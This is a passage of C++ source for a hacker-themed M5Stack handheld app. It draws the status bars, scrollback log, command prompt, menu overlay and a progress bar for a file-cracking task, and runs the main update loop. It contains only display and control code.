    int ram = (totalH > 0) ? (int)((uint64_t)(totalH - freeH) * 100u / totalH) : 0;
    if (ram > 100) ram = 100;
    if (ram < 0)   ram = 0;

    // ── Row 1: [BAT === xx%]  [RAM === xx%] ──────────────────
    const int stripW = CELL_RIGHT - MARGIN;
    const int eachW  = (stripW - BAR_GAP) / 2;
    const int batX   = MARGIN;
    const int ramX   = batX + eachW + BAR_GAP;

    char buf[16];
    snprintf(buf, sizeof(buf), "%d%%", bat);
    drawValueBar(c, batX, BAR1_Y, eachW, BAR_H, charging ? "BAT++" : "BAT", buf, bat);

    snprintf(buf, sizeof(buf), "%d%%", ram);
    drawValueBar(c, ramX, BAR1_Y, eachW, BAR_H, "RAM", buf, ram);

    // ── Row 2: [EXP ====================== LVx] ───────────────
    snprintf(buf, sizeof(buf), "LV%lu", (unsigned long)_stats.level());
    drawValueBar(c, MARGIN, BAR2_Y, stripW, BAR_H, "EXP", buf, (int)_stats.xpProgress());

    // ── Header bottom divider ────────────────────────────────
    c.drawFastHLine(0, HEADER_DIVIDER_Y, SCR_W, Theme::DIM);

    Virus::draw(c, ms, _exhaustPhase != 0);
}

// ── Scrollback ────────────────────────────────────────────────

void App::_drawLog(M5Canvas& c) const {
    c.fillRect(0, LOG_TOP, SCR_W, LOG_BOT - LOG_TOP, Theme::BG);

    c.setFont(&fonts::Font0);
    c.setTextSize(1);
    c.setTextColor(Theme::FG, Theme::BG);
    c.setTextDatum(lgfx::top_left);

    // Newest line at bottom; older lines stack upward
    const int maxVis = (LOG_BOT - LOG_TOP) / LINE_H;
    for (int i = 0; i < maxVis && i < LOG_LINES; i++) {
        int idx = (_logHead - 1 - i + LOG_LINES * 4) % LOG_LINES;
        if (_logBuf[idx][0] == '\0') break;
        int y = LOG_BOT - LINE_H * (i + 1) + 1;
        c.drawString(_logBuf[idx], MARGIN, y);
    }
}

// ── Input prompt ──────────────────────────────────────────────

void App::_drawInput(M5Canvas& c) const {
    c.drawFastHLine(0, INPUT_DIVIDER_Y, SCR_W, Theme::DIM);
    c.fillRect(0, INPUT_DIVIDER_Y + 1, SCR_W, SCR_H - (INPUT_DIVIDER_Y + 1), Theme::BG);

    if (_crackState == CrackState::Running) {
        uint32_t pct = (_crackCtx.fileSize > 0)
            ? (uint32_t)((uint64_t)_crackCtx.bytesDone * 100 / _crackCtx.fileSize)
            : 0;
        if (pct > 100) pct = 100;
        char bar[21]; int filled = (int)(20 * pct / 100);
        for (int i = 0; i < 20; i++) bar[i] = (i < filled) ? '#' : ' ';
        bar[20] = '\0';
        char buf[40];
        snprintf(buf, sizeof(buf), "[%s] %lu%%", bar, (unsigned long)pct);
        c.setFont(&fonts::Font0);
        c.setTextSize(1);
        c.setTextColor(Theme::FG, Theme::BG);
        c.setTextDatum(lgfx::top_left);
        c.drawString(buf, MARGIN, INPUT_Y);
        return;
    }

    c.setFont(&fonts::Font0);
    c.setTextSize(1);
    c.setTextColor(Theme::FG, Theme::BG);
    c.setTextDatum(lgfx::top_left);

    const int promptX = MARGIN;
    c.drawString("$ ", promptX, INPUT_Y);

    // Typed-so-far slice
    char buf[LINE_COL];
    int n = _typeIdx;
    if (n > LINE_COL - 1) n = LINE_COL - 1;
    memcpy(buf, _typeLine, n);
    buf[n] = '\0';
    const int textX = promptX + 2 * CHAR_W;
    c.drawString(buf, textX, INPUT_Y);

    // Cursor block — solid while typing, blink when idle/done
    bool show = true;
    if (_typeLen == 0 || _typeDone) show = _cursorOn;
    if (show) {
        int cx = textX + n * CHAR_W;
        c.fillRect(cx, INPUT_Y, CHAR_W - 1, CHAR_H, Theme::FG);
    }
}

// ── Menu overlay (floats above input, log visible above) ─────────

void App::_drawMenuContent(M5Canvas& c) const {
    c.setFont(&fonts::Font0);
    c.setTextSize(1);

    int nItems = 0, itemH = MENU_ITEM_H, menuTop = 0;
    if (_menuState == MenuState::Root) {
        nItems = ROOT_N;
    } else if (_menuState == MenuState::Sub && _activeSubCmd) {
        nItems = _activeSubCmd->subCount();
        itemH  = _activeSubCmd->subItemH();
    }
    menuTop = INPUT_DIVIDER_Y - nItems * itemH;

    c.fillRect(0, menuTop, SCR_W, INPUT_DIVIDER_Y - menuTop, Theme::BG);
    c.drawFastHLine(0, menuTop, SCR_W, Theme::DIM);

    if (_menuState == MenuState::Root) {
        for (int i = 0; i < ROOT_N; i++) {
            int y   = menuTop + i * MENU_ITEM_H;
            bool hi = ((int)_menuHighlight == i);
            if (hi) c.fillRect(0, y, SCR_W, MENU_ITEM_H, Theme::PALE);
            c.setTextColor(Theme::FG, hi ? Theme::PALE : Theme::BG);
            c.setTextDatum(lgfx::middle_left);
            c.drawString(s_rootItems[i]->label(), MARGIN + 6, y + MENU_ITEM_H / 2);
        }
    }

    if (_menuState == MenuState::Sub && _activeSubCmd) {
        for (int i = 0; i < nItems; i++) {
            int y    = menuTop + i * itemH;
            bool hi  = ((int)_menuHighlight == i);
            bool act = _activeSubCmd->subIsActive(i);
            uint16_t col = act ? Theme::FG : Theme::DIM;
            if (hi) c.fillRect(0, y, SCR_W, itemH, Theme::PALE);
            c.setTextColor(col, hi ? Theme::PALE : Theme::BG);
            c.setTextDatum(lgfx::middle_left);
            c.drawString(_activeSubCmd->subLabel(i), MARGIN + 6, y + itemH / 2);
            if (act) {
                c.setTextDatum(lgfx::middle_right);
                c.drawString("*", SCR_W - MARGIN - 6, y + itemH / 2);
            }
        }
    }

    // Input area — show parent command label as typed hint while sub-menu is open
    c.drawFastHLine(0, INPUT_DIVIDER_Y, SCR_W, Theme::DIM);
    c.fillRect(0, INPUT_DIVIDER_Y + 1, SCR_W, SCR_H - (INPUT_DIVIDER_Y + 1), Theme::BG);
    c.setTextColor(Theme::FG, Theme::BG);
    c.setTextDatum(lgfx::top_left);
    c.drawString("$ ", MARGIN, INPUT_Y);

    const char* inputText = (_menuState == MenuState::Sub && _activeSubCmd)
                            ? _activeSubCmd->label() : "";
    const int textX = MARGIN + 2 * CHAR_W;
    if (inputText[0]) c.drawString(inputText, textX, INPUT_Y);
    if (_cursorOn) {
        int cx = textX + (int)strlen(inputText) * CHAR_W;
        c.fillRect(cx, INPUT_Y, CHAR_W - 1, CHAR_H, Theme::FG);
    }
}

// ── Main loop ─────────────────────────────────────────────────

void App::update() {
    M5.update();
    uint32_t ms = millis();

    if (_menuState == MenuState::PowerWait && ms - _powerOffMs >= 2000) {
        _stats.save();
        M5.Display.fillScreen(0);
        M5.Power.powerOff();
        while (true) { delay(1000); }
    }

    _handleTouch(ms);
    if (_crackState == CrackState::Running) _updateCracking(ms);
    _updateHunting(ms);
    _updateTyping(ms);

    _canvas->fillScreen(Theme::BG);
    _drawHud(*_canvas, ms);
    _drawLog(*_canvas);
    if (_menuState == MenuState::Root || _menuState == MenuState::Sub) {
        _drawMenuContent(*_canvas);
    } else {
        _drawInput(*_canvas);
    }
    _canvas->pushSprite(0, 0);
}
